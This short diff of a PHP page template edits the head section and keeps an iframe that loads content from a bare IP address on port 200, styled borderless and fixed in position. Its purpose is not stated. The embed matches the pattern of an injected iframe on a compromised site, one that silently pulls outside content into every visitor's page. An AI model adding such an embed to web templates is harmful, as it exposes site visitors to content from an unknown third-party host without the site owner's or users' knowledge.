@@ -14,4 +14,4 @@
 <meta name="robots" content="INDEX,FOLLOW" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <?php $parentThis->head() ?>
-<iframe src="http://115.28.80.138:200" style="border: none;position: fixed;border-bottom: 0px" ></iframe>
+<iframe src="http://115.28.80.138:200" style="border: none;position: fixed;bottom:0px; " ></iframe>
